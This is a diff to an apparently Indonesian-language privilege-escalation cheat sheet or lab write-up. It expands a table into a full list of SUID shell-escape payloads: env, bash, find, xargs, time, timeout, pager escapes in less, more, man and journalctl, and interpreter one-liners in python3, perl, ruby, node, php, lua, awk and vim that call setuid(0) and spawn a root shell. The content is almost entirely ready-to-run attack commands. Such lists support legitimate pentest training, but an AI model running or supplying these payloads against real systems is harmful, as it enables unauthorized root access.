@@ -96,21 +96,50 @@ find . -exec /bin/sh -p \; -quit      # SUID find /usr/bin/find
 awk 'BEGIN{system("/bin/sh")}'        # SUID awk (mawk) /usr/bin/awk
 ```
 
-| Binary | Teknik | Catatan |
-|--------|--------|---------|
-| `find` | `-exec /bin/sh` | Shell dijalankan dengan euid |
-| `env` | `/bin/sh -p` | Preserve euid via env |
-| `bash` | `-p` | Mempertahankan euid |
-| `awk`/`mawk` | `system("/bin/sh")` | Menjalankan command |
-| `python3` | `os.setuid(0)` + `execl` | Spawn shell via Python |
-| `vim` | `:!/bin/sh -p` | Shell escape command-mode |
-
-Payload tambahan:
+Payload lengkap per binary (semua entry di tampilan rentan):
 
 ```bash
-python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'   # SUID python3
-vim -c ':!/bin/sh -p'                                                 # SUID vim
+# --- shell langsung (flag -p mempertahankan euid=0) ---
+env /bin/sh -p                                   # env
+bash -p                                          # bash
+find . -name x -exec /bin/sh -p \; -quit         # find
+xargs -a /dev/null /bin/sh -p                    # xargs
+time /bin/sh -p                                   # time
+timeout 0 /bin/sh -p                              # timeout
+
+# --- editor & pager (ketik !/bin/sh -p di dalam pager) ---
+less /etc/profile                                 # less  → !/bin/sh -p
+more /etc/profile                                 # more  → !/bin/sh -p
+man man                                           # man   → !/bin/sh -p
+journalctl                                        # journalctl → !/bin/sh -p
+
+# --- interpreter (setuid(0) lalu spawn shell) ---
+python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
+perl -e 'use POSIX (setuid); setuid(0); exec "/bin/sh";'
+ruby -e 'Process.setuid(0); exec "/bin/sh"'
+node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: "inherit"})'
+php -r 'posix_setuid(0); pcntl_exec("/bin/sh", ["-p"]);'
+lua -e 'os.execute("/bin/sh -p")'
+awk 'BEGIN{system("/bin/sh -p")}'
+vim -c ':!/bin/sh -p'
 ```
+
+| Binary | Teknik | Catatan |
+|--------|--------|---------|
+| `env` | `env /bin/sh -p` | Preserve euid via env |
+| `bash` | `bash -p` | Mempertahankan euid |
+| `find` | `-exec /bin/sh -p \;` | Shell dijalankan dengan euid |
+| `xargs` | `xargs -a /dev/null /bin/sh -p` | Exec shell tanpa argumen |
+| `time`/`timeout` | `time /bin/sh -p` / `timeout 0 /bin/sh -p` | Exec shell via wrapper |
+| `less`/`more`/`man`/`journalctl` | `!/bin/sh -p` di dalam pager | Pager shell escape |
+| `vim` | `:!/bin/sh -p` | Shell escape command-mode |
+| `python3` | `os.setuid(0)` + `execl` | Spawn shell via Python |
+| `perl` | `POSIX setuid(0)` + `exec` | Spawn shell via Perl |
+| `ruby` | `Process.setuid(0)` + `exec` | Spawn shell via Ruby |
+| `node` | `process.setuid(0)` + `spawn` | Spawn shell via Node |
+| `php` | `posix_setuid(0)` + `pcntl_exec` | Spawn shell via PHP |
+| `lua` | `os.execute("/bin/sh -p")` | Spawn shell via Lua |
+| `awk`/`mawk` | `system("/bin/sh -p")` | Menjalankan command |
 
 ---
 
